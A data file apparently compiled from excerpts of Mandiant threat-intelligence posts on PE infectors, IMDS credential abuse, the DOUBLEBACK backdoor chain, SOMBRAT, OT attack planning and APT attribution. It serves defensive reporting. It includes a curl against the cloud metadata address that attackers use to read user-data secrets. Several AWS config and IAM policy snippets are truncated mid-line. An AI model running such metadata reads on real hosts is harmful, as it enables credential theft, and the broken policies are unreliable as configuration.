uncovered were specifically targeting OT systems. Due to the worm-like nature of many PE infectors, there are multiple scenarios and attack vectors in which OT assets can become infected, most often without being specifically targeted. Table 1 provides a non-exhaustive list of examples. \nPE infectors often propagate by scanning filesystems, memory, local drives, network shares, and portable media for clean PE files and, once located, alter the clean PE by appending malicious code. For example, when the malware finds a file such as \"EventViewer.exe\", a legitimate Honeywell software used to view security alarms, it appends itself to the executable but keeps the original name and the program functionality. Procedures used to execute this vary in complexity among different families and variants of PE infectors. Table 2 presents a random sample of infected OT OEM binaries we uncovered. \nPE infected malware introduced in OT environments can propagate quickly where protection levels are consistent throughout systems and networks. For example, if the initial infection vector is through portable media due to a lack of implementation of scanning and sanitization controls, then asset ", "source": "mandiant"}, {"title": "Prevention", "content": "Mandiant provides the following recommendations for prevention, detection, and remediation of PE infectors in OT environments. For support reach out to Mandiant OT Consulting. \nPrevention \nDefenders should prioritize prevention for PE infecting malware to decrease the risk of infections spreading to critical assets. \nPerform periodic backups for critical assets and ensure backups are tested. The backups should be stored offline and periodically tested.   \nDevelop policies and procedures for identifying, controlling, and authorizing use of portable media such as laptops, USB, and CDs: Sanitize or scan portable media with up-todate anti-virus using a heuristics-based engine prior to connecting to OT assets. Evaluate portable media and data entering the OT environment from untrusted sources and have external parties use controlled and authorized portable media.   \nEnsure OT assets do not have direct network access or mapped network shares to IT assets unless absolutely required. Properly segment or airgap critical safety assets from larger networks and monitor network traffic for anomalies to and from these assets.   \nMonitor vendors' and contractors' use of OT systems, including for example portable media, or work orders.   \nWhere feasible: Disable USB ports for devices where their use is not needed and, if possible, utilize port-blockers. Install application whitelisting on OT assets or portable media used with OT assets (e.g., maintenance laptops and test equipment). Implement device control on OT assets to ensure only approved portable media is used. \nDetection \nPE infecting malware and files affected by PE infectors often have high detection rates by antivirus engines. However, OT systems may be unable to use anti-virus or endpoint protection because of constraints such as service-level agreements (SLA). Defenders should prioritize detection of this threat prior to entering the OT environment. This can be achieved by scanning devices and data brought into the OT environment with updated anti-virus or sanitizing it prior to use. \nDetecting the presence of PE infecting malware can be difficult on assets where traditional anti-virus or endpoint protection is not used. This is because the infected PE files may have the ability to run the legitimate code even after being infected, leaving very few user-observable indicators. We suggest defenders review network traffic to and from systems that could be used to support C2 capabilities (e.g., systems at Purdue level 2 and 3). Identifying suspicious beaconing or C2 activity from these assets can also help in identifying infected system in the environment. ", "source": "mandiant"}, {"title": "Attribution", "content": "UNC2903 is a group whose motivations are unknown and tracked by Mandiant since July 2021. UNC2903 is opportunistic, hunting for vulnerable systems on the internet, and has been observed stealing data from at least one victim, however, Mandiant did not observe any monetization of the stolen data such as extortion or sale. Analysis of web logs showed that the actors were specifically scanning for adminer.php and testing for CVE-2019- 0211, an Apache Root Privilege Escalation to install the WSO webshell, directly from GitHub. \nEighteen minutes after the CVE-2021-21311 vulnerable adminer.php was discovered by the threat actor through automated scanning, Mandiant observed indexing of the adminer.php by Telegram bot, indicating that the link to the adminer.php was shared in a Telegram chat group. A few minutes later, an automated session from a free VPN service also scanned the adminer.php. The same automated process was executed from different a different IP a few hours later, followed by interactive activity and successful access of the IMDS service 3 hours and 15 minutes after the initial access. ", "source": "mandiant"}, {"title": "Prevention", "content": "Detecting EC2 Instances with IMDSv1 \nOld Services, New Tricks: Cloud Metadata Abuse by UNC2903 | Google Cloud Blog Audit currently deployed EC2 Instance to verify if IMDSv1 or IMDSv2 is being used in the environment. \nNative AWS Services: AWS Security Hub \u2013 Check [EC2.8] EC2 instances should use IMDS v2 CloudWatch \u2013 MetadataNoToken  (Counts the number of times the Instance Metadata service was successfully access without a token (i.e., IMDSv1)) AWS Config \u2013 A Config rule that checks if the organization's EC2 Instance is set to require HTTPTokens (see the following).   \nAWSTemplateFormatVersion: \"2010-09-09\"   \nDescription: \"\"   \nResources: ConfigRule: Type: \"AWS::Config::ConfigRule\" Properties: ConfigRuleName: \"ec2-imdsv2-check\" Scope: ComplianceResourceTypes: - \"AWS::EC2::Instance\" Description: \"A Config rule that chec Source: Owner: \"AWS\" SourceIdentifier: \"EC2_IMDSV2_CHEC   \nParameters: {}   \nMetadata: {}   \nConditions: {}   \n\uedd9 \nOpen-Source Tools: \nO Prowler - Check 7.86 \u2013 Check if EC2 Instance Metadata Service Version 2 (IMDSv2) is Enabled and Required \n./prowler -c check786 \nMetabadger \n./metabadger discover-metadata \nCloudMapper \u2013 EC2_IMDSV2_NOT_ENFORCED \nAWS CLI: \naws ec2 describe-instances --filters Name= tokens,Values $=$ optional --query \"Reservatio Instances[\\*].{Instance:InstanceId}\"  --regi \nGuardDuty alert for use of EC2 instance credential from outside of current account. \nInstanceCredentialExfiltration.InsideAWS - High: If EC2 Instance Credential is used by another AWS Account (see Figure 9 ).   \nInstanceCredentialExfiltration.OutsideAWS - High: If EC2 Instance Credential is used by an external IP Address.   \nRestrict access to IMDS to a limited set of users or EC2 role   \nExecute the following command to limit the IMDS service to bobuser: \nip-lockdown 169.254.169.254 bobuser ", "source": "mandiant"}, {"title": "Prevention", "content": "Review all EC2 Instances, and ensure User Data Scripts for EC2s do not contain cleartext secrets or sensitive data \nUser Data Scripts are a set of commands that you provide during the launch of the EC2. \nThe User Data Scripts are performed using root permissions, and it can be viewed via IMDS. An attacker can read the script being ran by a simple curl command. \ncurl http://169.254.169.25 \nLimit the number of HTTP Put Response Hops (minimum value is defaulted to 1 and the maximum is 64). \nThe following example limits the maximum number of hops that occurs to 1: \n{ \"Version\": \"2012-10-17\", \"Statement\": { \n\"Sid\": \"MaxImdsHopLimit\", \"Effect\": \"Deny\", \"Action\": \"ec2:RunInstances\", \"Resource\": \"arn:aws:ec2:\\*:\\*:insta \"Condition\": { \"NumericLessThanEquals\": {\"ec2:MetadataHttpPutResponseH } } } \nLimit API Calls to use IMDSv2 to deliver the Amazon EC2 Role credentials via an IAM Policy \n\"Version\": \"2012-10-17\", \"Statement\": { \"Sid\": \"RequireAllEc2RolesToUseV2\", \"Effect\": \"Deny\", \"Action\": \"\\*\", \"Resource\": \"\\*\" \"Condition\": { \"NumericLessThan\": {\"ec2:RoleDelivery\": \"2.0\"} } } } \nLimit access to be able to modify the EC2 Instance metadata service \n{ \"Version\": \"2012-10-17\", \"Statement\": { \n\"Sid\": \"LimitModifyInstanceMetadat \"Effect\": \"Deny\", \"Action\": \"ec2:ModifyInstanceMetada \"Resource\": \"\\*\", \"Condition\": { \"StringNotLike\": {\"aws:PrincipalARN\": \"arn:aws:i } } } \nRestrict the scope of IAM role / credential access to S3 buckets   \n\uedd9 Block or reduce of IAM role / credential usage ability from the public Internet   \nLimit server Internet egress to prevent outbound server traffic   \nImplement S3 Bucket Policies to further restrict access to the S3 Bucket   \nEnable VPC flows and S3 bucket / object level access data events   \nProxy or monitor web requests for possible exploitation   \nLimit service ports allowed inbound or outbound to the server   \nSanitize or limit unnecessary HTTP headers to the web server   \nLog all the things, and prioritize alerting for possible credential abuse   \nFollow Amazon Web Services best practices for solutions, and regularly test security controls ", "source": "mandiant"}, {"title": "Conclusion", "content": "Address space layout randomization is a core defense against memory corruption exploits. This post covers some history of ASLR as implemented on Windows, and also explores some capabilities and limitations of the Windows implementation. In reviewing this post, defenders gain insight on how to build a program to best take advantage of ASLR and \n2025/5/7 11:20 \nother features available in Windows to more aggressively apply it. Attackers can leverage ASLR limitations, such as address space randomization applying only per boot and randomization relocating the entire image as one unit, to overcome ASLR using brute force and pointer leak attacks. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Using a JIT compiler hook to replace the MSIL is a powerful technique that makes static analysis almost impossible. Although this technique is not new, I haven't seen many .NET malwares making use of it, let alone trying to implement their own adaptation instead of using widely available protectors like ConfuserEx. Hopefully, with this blog post and JITM, analysts will now have the tools and \nBypassing MassLogger Anti-Analysis - a Man-in-the-Middle Approach | Mandiant | Google Cloud Blog knowledge to defeat MassLogger or any future variants that use a similar technique. \nIf this is the type of work that excites you; and, if you thrive to push the state of the art when it comes to malware analysis and reverse engineering, the Front Line Applied Research and Expertise (FLARE) team may be a good place for you. The FLARE team faces fun and exciting challenges on a daily basis; and we are constantly looking for more team members to tackle these challenges head on. Check out FireEye's career page to see if any of our opportunities would be a good fit for you. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Packers and crypter services provide threat actors an easy and convenient option to outsource the workload of keeping their real payloads undetected and unclassified as long as possible. They are regularly finding nifty ways to bypass sandbox environments with anti-analysis techniques; hence, detonating malware samples in a sandbox environment that try to model real user behavior is a safe bet. \nFireEye MVX Engine both detects and blocks this activity. ", "source": "mandiant"}, {"title": "Attribution", "content": "Based on the available campaign information, the attacker doesn't align with any financially motivated threat groups currently tracked by FireEye. The attacker's understanding of the Click2Gov host requirements, process logging details, payment card fields, and internal communications protocols demonstrates an advanced knowledge of the Click2Gov application. Given the manner in which underground forums and marketplaces function, it is possible that tool development could have been contracted to third parties and remote access to compromised systems could have been achieved by one entity and sold to another. There is much left to be uncovered about this attacker. \nWhile it is also possible the attack was conducted by a single individual, FireEye assesses, with moderate confidence, that a team was likely involved in this campaign based on the following requisite skillsets: \nAbility to locate Click2Gov installations and identify exploitable vulnerabilities. Ability to craft or reuse an exploit to penetrate the target organization's network environment. Basic JSP programming skills. \nAdvanced knowledge of Click2Gov payment processes and software sufficient to develop moderately sophisticated malware. Proficient $\\mathsf{C}/\\mathsf{C}++$ programming skills. General awareness of operational security. Ability to monetize stolen payment card information. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In addition to a regimented patch management program, FireEye recommends that organizations consider implementing a file integrity monitoring solution to monitor the static content and code that generates dynamic content on e-commerce webservers for unexpected modifications. Another best practice is to ensure any web service accounts run at least privilege. \nAlthough the TTPs observed in the attack lifecycle are generally consistent with other financially motivated attack groups tracked by FireEye, this attacker demonstrated ingenuity in crafting malware exploiting Click2Gov installations, achieving moderate success. Although it may transpire in a new form, FireEye anticipates this threat actor will continue to conduct interactive and financially motivated attacks. ", "source": "mandiant"}, {"title": "Introduction", "content": "Kubernetes can be difficult to harden. Enforcing authentication for internal services, applying granular NetworkPolicies, and restricting unsafe workloads with Pod Security are now table stakes for preventing post-exploitation activity that can compromise an entire cluster. These security configurations that limit attack surface help prevent against known and unknown attacks alike. \nAzure Kubernetes Services clusters using \"Azure CNI\" for the \"Network configuration\" and \"Azure\" for the \"Network Policy\" were affected by this privilege escalation vulnerability. An attacker with command execution in a Pod running within an affected Azure Kubernetes Services cluster could download the configuration used to provision the cluster node, extract the transport layer security (TLS) bootstrap tokens, and perform a TLS bootstrap attack to read all secrets within the cluster. This attack did not require the Pod to be running with hostNetwork set to true  and does not require the Pod to be running as root . \n\"WireServing\" Up Credentials: Escalating Privileges in Azure Kubernetes Services | Google Cloud Blog Mandiant disclosed this vulnerability to Microsoft via the MSRC vulnerability disclosure program, and Microsoft has fixed the underlying issue. ", "source": "mandiant"}, {"title": "Prevention", "content": "Adopting a process to create restrictive NetworkPolicies that allow access only to required services prevents this entire attack class. Privilege escalation via an undocumented service is prevented when the service cannot be accessed at all. \nPosted in Threat Intelligence ", "source": "mandiant"}, {"title": "Conclusion", "content": "While FormBook is not unique in either its functionality or distribution mechanisms, its relative ease of use, affordable pricing structure, and open availability make FormBook an attractive option for cyber criminals of varying skill levels. In the last few weeks, FormBook was seen downloading other malware families such as NanoCore. The credentials and other data harvested by successful FormBook infections could be used for additional cyber crime activities including, but not limited to: identity theft, \nSignificant FormBook Distribution Campaigns Impacting the U.S. and South Korea | Mandiant | Google Cloud Blog continued phishing operations, bank fraud and   \nextortion. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "ETW provides a very powerful lightweight trace mechanism conveniently baked into Windows. Among other things it can be used to potentially detect malicious activity on an endpoint. Using pywintrace to capture ETW data is simpler than using multiple tools to do the same job, and since it is written in Python it is easy to modify for whatever is needed. This makes the job of slogging through the hundreds of ETW providers much easier, and accelerates efforts to find interesting providers. \nDownload pywintrace today! ", "source": "mandiant"}, {"title": "Acknowledgement", "content": "Special thanks to the entire ICE team. ICE is a small, highly trained, team of engineers that incubate and deliver capabilities that matter to our products, our clients and our customers. ICE is always looking for exceptional candidates interested in solving challenging problems quickly. \nAlso, thanks to Microsoft for their extensive blog posts and documentation on ETW. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Introduction", "content": "The 2024 Summer Olympics taking place in Paris, France between July and August creates opportunities for a range of cyber threat actors to pursue profit, notoriety, and intelligence. For organizations involved in the event, understanding relevant threats is key to developing a resilient \nPhishing for Gold: Cyber Threats Facing the 2024 Paris Olympics | Google Cloud Blog security posture. Defenders should prepare against a variety of threats that will likely be interested in targeting the Games for different reasons: \nCyber espionage groups are likely to target the 2024 Olympics for information gathering purposes, due to the volume of government officials and senior decision makers attending. \nDisruptive and destructive operations could potentially target the Games to cause negative psychological effects and reputational damage. This type of activity could take the form of website defacements, distributed denial of service (DDoS) attacks, the deployment of wiper malware, and operational technology (OT) targeting. As a high profile, large-scale sporting event with a global audience, the Olympics represents an ideal stage for such operations given that the impact of any disruption would be significantly magnified. \nInformation operations will likely leverage interest in the Olympics to spread narratives and disinformation to target audiences. In some cases, threat actors may leverage disruptive and destructive attacks to amplify the spread of particular narratives in hybrid operations. \nFinancially-motivated actors are likely to target the Olympics in various ways, including ticket scams, theft of PII, and extortion against entities during a period of heightened pressure. Capitalizing on interest in the games, threat actors are likely to use olympics-related lures in social engineering operations that are not necessarily targeting the games. \nOlympics-related cyber operations could impact a variety of entities. For some organizations involved in the Games such as sponsors, this could expose them to state-sponsored actors and destructive campaigns that are not typically active in their sectors. Other threats, such as cybercrime and extortion operations, will be more familiar, yet will likely become more prolific and persistent against entities involved in the Games. ", "source": "mandiant"}, {"title": "Targeting", "content": "Beginning in late 2017, APT44 (alias FROZENBARENTS) targeted organizations involved in Olympic activities in South Korea. The activity included credential phishing, and distribution of Windows,MacOS, and Android malware. In the Android campaign, APT44 obtained legitimate copies of Android applications popular in South Korea, modified them to add a custom mobile implant, and then published the trojanized apps to the Play Store. The implant, CHEMISTGAMES, was a modular framework designed for gathering data at scale, and included significant automation, abstraction, and specialization for mobile devices. The modular structure of CHEMISTGAMES ensured that the attackers could hide sensitive payloads and reserve them for specific targeted devices. \nGoogle's Threat Analysis Group (TAG) discovered the Android campaign, developed signatures to protect user devices and block the malware on Play, and banned attacker-controlled developer accounts. Those detections protected users in other APT44 campaigns that attempted to infect users with CHEMISTGAMES, including an attempt to target Ukrainians with a fake webmail app, and domestically-focused campaigns targeting Russian businesses. \nMandiant suggests that UNC4057 (aka COLDRIVER) also poses a risk, despite no previously observed targeting of the Games. The group has conducted both cyber espionage and information operations activity in support of Russia, collecting personally identifiable information (PII) via credential harvesting operations that may support the nation's strategic intelligence priorities, and performing hack-and leak-campaigns to sow discontent in the UK in 2022. This activity cluster may target French organizations affiliated with the games and high profile individuals from NATO member countries who may be in attendance. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Although Poison Ivy has been a proven threat for some time, the delivery mechanism for this backdoor uses recent publicly available techniques that differ from previously observed campaigns. Through the use of PowerShell and publicly available security control bypasses and scripts, most steps in the attack are performed exclusively in memory and leave few forensic artifacts on a compromised host. \nFireEye HX Exploit Guard is a behavior-based solution that is not affected by the tricks used here. It detects and blocks this threat at the initial level of the attack cycle when the malicious macro attempts to invoke the first stage PowerShell payload. HX also contains generic detections for the registry persistence, AppLocker bypasses and subsequent stages of PowerShell abuse used in this attack. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Threat intelligence provides immense value to red teamers who are looking to perform offensive research and development and emulate real-life attackers. By looking at what real attackers are doing, a red teamer can glean inspiration for future tooling or TTPs. \nDLL abuse techniques can be helpful from an evasion standpoint in multiple phases of the attack lifecycle, such as persistence and lateral movement. There will continue to be more executables discovered that are susceptible to DLL abuse and used by security professionals and adversaries alike. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "Cobalt Strike continues to be the C2 framework of choice for both legitimate security testers and threat actors alike. Our hope is that with a more thorough understanding of the framework's capabilities and common usage, defenders will be more equipped to find new ways to hunt, respond to, and attribute malicious actors using this tool. ", "source": "mandiant"}, {"title": "Conclusion", "content": "This actor has likely been active since at least 2014, and its continuous targeting of the Ukrainian Government suggests a cyber espionage motivation. This is supported by the ties to the socalled LPR's security service. While more evidence is needed for definitive attribution, this activity showcases the accessibility of competent cyber espionage capabilities, even to sub-state actors. While this specific group is primarily a threat to Ukraine, nascent threats to Ukraine have previously become international concerns and bear monitoring. ", "source": "mandiant"}, {"title": "Summary", "content": "Malicious package and LNK files \n982565e80981ce13c48e0147fb271fe5 e92d01d9b1a783a23477e182914b2454 ec0fb9d17ec77ad05f9a69879327e2f9 fe198e90813c5ee1cfd95edce5241e25 a5300dc3e19f0f0b919de5cda4aeb71c 4b8aac0649c3a846c24f93dc670bb1ef \nRelated File \n0d6a46eb0d0148aafb34e287fcafa68f (decoy document)   \nbace12f3be3d825c6339247f4bd73115 (decoy document)   \na40fb835a54925aea12ffaa0d76f4ca7 (decoy document) \nQuasar RAT Samples \n50b1f0391995a0ce5c2d937e880b93ee 47161360b84388d1c254eb68ad3d6dfa 07633a79d28bb8b4ef8a6283b881be0e dc0ab74129a4be18d823b71a54b0cab0 bbcce9c91489eef00b48841015bb36c1 \n3ddc543facdc43dc5b1bdfa110fcffa3 5b5060ebb405140f87a1bb65e06c9e29 80b3d1c12fb6aaedc59ce4323b0850fe d2c6e6b0fbe37685ddb865cf6b523d8c dc0ab74129a4be18d823b71a54b0cab0 dca799ab332b1d6b599d909e17d2574c ", "source": "mandiant"}, {"title": "Conclusion", "content": "As the scenario demonstrates, attackers have a wider surface area to persist and steal data because of the adoption of cloud infrastructure and collaboration platforms. The move to these cloud platforms brings useful functionality and security features, but configuring everything correctly can be overwhelming for a team that is new to the technology. \nNot only are there many access, permission, and protection configurations to consider, but teams should also make sure that they would be able to fully investigate various attacks that could happen by storing the correct logs. \nUnderstanding what technologies your organization uses and performing threat modeling is one way to make sure you have these logs and investigative processes set up should you need to investigate. \nFor details on how Mandiant can assist with your cloud security, please check out the following resources: \nSecurity Assessment for Microsoft 365 Cloud Architecture and Security Assessment ", "source": "mandiant"}, {"title": "Targeting", "content": "The documents from NTC Vulkan also include contents related to OT systems in two projects: Krystal-2B and Amesit. Krystal-2B is a training platform that simulates OT attacks against different types of OT environments in coordination with some IO components by leveraging Amesit \"for the purpose of disruption.\" The Krystal-2B documentation highlights scenarios against Russian military infrastructure, rail systems, airports, sea ports, and energy and water utilities, but does not detail specific methodologies on the malicious activities executed within these exercises. Krystal2B appears designed to support both offensive exercises against OT environments (Figure 4) and defensive exercises to examine vulnerabilities in Russian military infrastructure. \nThe Krystal-2B project relies on tooling from another project named Amesit. The OT portion of the project is referenced in a set of testing requirements for Amesit, which describes the implementation of simulated OT test bed environments for rail and pipeline control systems. The Amesit documentation indicates these models would be supported by either graphical or physical models of these systems to visualize the effects of cyber attacks, clearly establishing these industries as Russia's targets of interest for OT-oriented attacks. \nThe only attack-related requirement for the OT test beds is that they provide \"simulation of ARPspoofing attacks, leading to violations of simulated technological processes.\" These violations include either common IT-oriented impacts on the network infrastructure or complex changes in the parameters of the OT via \"specialized software.\" It is unclear whether such software refers to Amesit tooling, legitimate programmable logic controller (PLC) engineering software, or some other existing capabilities. While we have not linked this activity to existing toolsets, frameworks like INCONTROLLER are designed to support these types of parameter changes. \nThe document also specifies specific parameters of the control systems that the attacker should be able to affect and physical impacts the attacker should be able to generate. These specifications provide potential insight into the process-level design of these attack scenarios. \nFor rail systems, this includes manipulating the speed of trains, creating unauthorized track transfers, causing car traffic barriers to fail, and causing combined heat and power (CHP) units to fail, with the explicit objective of causing train collisions and accidents. \nFor pipeline systems, this includes closing valves, shutting down pumps, overfilling tanks, spilling materials, and causing pump cavitation and overheating. \nAlthough there is little information in both documents on how the attacks would occur in a real setting, the capabilities we observed are consistent to those Mandiant has observed in previous attacks and tooling from Russian-sponsored actors. Another noteworthy observation is the incorporation of IO capabilities in the same projects that describe OT targeting, which hints at the likelihood of deploying campaigns that leverage both resources to support complex information warfare operations. ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant has merged UNC5337 into UNC5221, confirming initial suspicion that these clusters of activity were likely related. Apart from CVE-2023- 46805 and CVE-2024-21887, Mandiant has previously observed UNC5221 conducting zero day exploitation of CVE-2023-4966, impacting NetScaler ADC and NetScaler Gateway appliances. UNC5221 has targeted a wide range of countries and verticals during their operations and has leveraged an extensive set of tooling, spanning passive backdoors to trojanized legitimate components on appliances. Additionally, Mandiant previously observed UNC5221 leveraging a likely ORB network of compromised Cyberoam appliances to enable intrusion operations. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Following the Jan. 10, 2024, disclosure of CVE2023-46805 and CVE-2024-21887, Mandiant observed widespread exploitation by UNC5221 \nIvanti Connect Secure VPN Targeted in New Zero-Day Exploitation | Google C targeting Ivanti Connect Secure appliances across a wide range of countries and verticals. Mandiant assesses that defenders should be prepared for widespread, opportunistic exploitation, likely targeting credentials and the deployment of web shells to provide future access. Additionally, if proof-of-concept exploits for CVE-2025-0282 are created and released, Mandiant assesses it is likely additional threat actors may attempt targeting Ivanti Connect Secure appliances. ", "source": "mandiant"}, {"title": "Targeting", "content": "UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads<.>com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company. \nAnother example is a freight / transport company that received a phish with subject, \"compton ca to flowery branch ga\", while a firm that recruits and places long-haul truck drivers received a simple, \"driver\" in the subject line. \nA utility company received a phish with subject, \"easement to bore to our stairwell area.\" \nWhile not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1. \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blog Several insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2. \nInterestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized. \nSome patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google and 5 in Table 3). Most of the phishing emails with lures containing \"worker\" targeted U.S. organizations. As \"worker\" isn't a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker. ", "source": "mandiant"}, {"title": "Targeting", "content": "UNC2529's phishing campaign was both global and impacted an array of industries (Industry and Regional Targeting graphics are greater than $100\\%$ due to rounding). While acknowledging some telemetry bias, in both waves the U.S. was the primary target, while targeting of EMEA and Asia \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blog and Australia were evenly dispersed in the first wave, as shown in Figure 1. \nIn the second wave, EMEA's percentage increased the most, while the U.S. dropped slightly, and Asia and Australia remained at close to the same level, as illustrated in Figure 2. \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blog \nFigure 2: UNC2529 phishing campaign, second wave \nAlthough Mandiant has no evidence about the objectives of this threat actor, their broad targeting across industries and geographies is consistent with a targeting calculus most commonly seen among financially motivated groups. ", "source": "mandiant"}, {"title": "Overview", "content": "The Triple DOUBLE malware ecosystem consists of a downloader (DOUBLEDRAG) (or alternatively an Excel document with an embedded macro), a dropper (DOUBLEDROP), and a backdoor (DOUBLEBACK). As described in the previous section, the initial infection vector starts with phishing emails that contain a link to download a malicious payload that contains an obfuscated JavaScript downloader. Once executed, DOUBLEDRAG reaches out to its C2 server and downloads a memory-only dropper. The dropper, DOUBLEDROP, is implemented as a PowerShell script that contains both 32-bit and 64-bit instances of the backdoor DOUBLEBACK. The dropper performs the initial setup that establishes the backdoor's persistence on the compromised system and proceeds by injecting the backdoor into its own process (PowerShell.exe) and then executing it. The backdoor, once it has the execution control, loads its plugins and then enters a communication loop, \nfetching commands from its C2 server and dispatching them. One interesting fact about the whole ecosystem is that only the downloader exists in the file system. The rest of the components are serialized in the registry database, which makes their detection somewhat harder, especially by filebased antivirus engines. ", "source": "mandiant"}, {"title": "Overview", "content": "The dropper component is implemented as an obfuscated in-memory dropper written in PowerShell. Two payloads are embedded in the script-the same instances of the DOUBLEBACK backdoor compiled for 32 and 64-bit architectures. The dropper saves the encrypted payload along with the information related to its decryption and execution in the compromised system's registry database, effectively achieving a file-less malware execution. ", "source": "mandiant"}, {"title": "Overview", "content": "The observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64- bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process. \nIn contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoor's main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins. \nThe backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections. \nNext, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume's serial number and a hardcoded salt value, as shown in Figure 10. \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blo Next, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11. \nOnce the GUID is generated the malware formats it as Global\\{<guid>} and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into. ", "source": "mandiant"}, {"title": "Overview", "content": "The DOUBLEBACK backdoor executes its main functionality while injected in a dedicated msiexec.exe process (provided BitDefender AV is not found running on the system). The main logical modules of the backdoor are its configuration, plugin management, and communications. In the following sections we will describe the first two, while a future blog post will focus on the communications and the evolution of the backdoor. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Considerable resources were employed by UNC2529 to conduct their December phishing campaign. Almost 50 domains supported various phases of the effort, targets were researched, and a legitimate third-party domain was compromised. The threat actor made extensive use of obfuscation and fileless malware to complicate detection to deliver a well coded and extensible backdoor. UNC2529 is assessed as capable, professional and well resourced. The identified wide-ranging targets, across geography and industry suggests a financial crime motive. \nDOUBLEBACK appears to be an ongoing work in progress and Mandiant anticipates further actions by UNC2529 to compromise victims across all industries worldwide. ", "source": "mandiant"}, {"title": "Overview", "content": "SOMBRAT was first reported by Blackberry Cylance in November 2020 as \"The CostaRicto Campaign: Cyber-Espionage Outsourced\" as a potential espionage-for-hire criminal group. Mandiant has now observed SOMBRAT alongside FIVEHANDS ransomware intrusions. \nThe SOMBRAT backdoor is packaged as a 64-bit Windows executable. It communicates with a configurable command and control (C2) server via multiple protocols, including DNS, TLS-encrypted TCP, and potentially WebSockets. Although the backdoor supports dozens of commands, most of them enable the operator to manipulate an encrypted storage file and reconfigure the implant. The backdoor's primary purpose is to download and execute plugins provided via the C2 server. In contrast to the SOMBRAT version published in November 2020, Mandiant observed additional obfuscation and armoring to evade detection, this SOMBRAT variant has been hardened to discourage analysis. Program metadata typically included by the compiler has been stripped and strings have been inlined and encoded via XOR-based routines. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Mandiant observed SOMBRAT and FIVEHANDS ransomware by the same group since January 2021 While similarities between HELLOKITTY and FIVEHANDS are notable, ransomware may be used by different groups through underground affiliate programs. Mandiant will assign an uncategorized cluster based on multiple factors including infrastructure used during intrusions and as such, not all SOMBRAT or FIVEHANDS ransomware intrusions may have been conducted by UNC2447. WARPRISM and FOXGRABBER have been used in SUNCRYPT and DARKSIDE ransomware demonstrating additional complexity and sharing between different ransomware affiliate programs. ", "source": "mandiant"}, {"title": "Overview", "content": "Mandiant assesses with high confidence that APT45 is a moderately sophisticated cyber operator that supports the interests of the DPRK. Since at least 2009, APT45 has carried out a range of cyber operations aligned with the shifting geopolitical interests of the North Korean state. Although the group's earliest observed activities consisted of espionage campaigns against government agencies and defense industries, APT45 has expanded its remit to financially-motivated operations, including targeting of the financial vertical; we also assess with moderate confidence that APT45 has engaged in the development of ransomware. Additionally, while multiple DPRK-nexus groups focused on healthcare and pharmaceuticals during the initial stages of the COVID-19 pandemic, APT45 has continued to target this vertical longer than other groups, suggesting an ongoing mandate to collect related information. Separately, the group has conducted operations against nuclear-related \nentities, underscoring its role in supporting DPRK priorities. ", "source": "mandiant"}, {"title": "Targeting", "content": "Similar to other cyber threat activity attributed to North Korea-nexus groups, shifts in APT45 operations have reflected the DPRK's changing priorities. Malware samples indicate the group was active as early as 2009, although an observed focus on government agencies and the defense industry was observed beginning in 2017. Identified activity in 2019 aligned with Pyongyang's continued interest in nuclear issues and energy. Although it is not clear if financially-motivated operations are a focus of APT45's current mandate, the group is distinct from other North Korean operators in its suspected interest in ransomware. Given available information, it is possible that APT45 is carrying out financiallymotivated cybercrime not only in support of its own operations but to generate 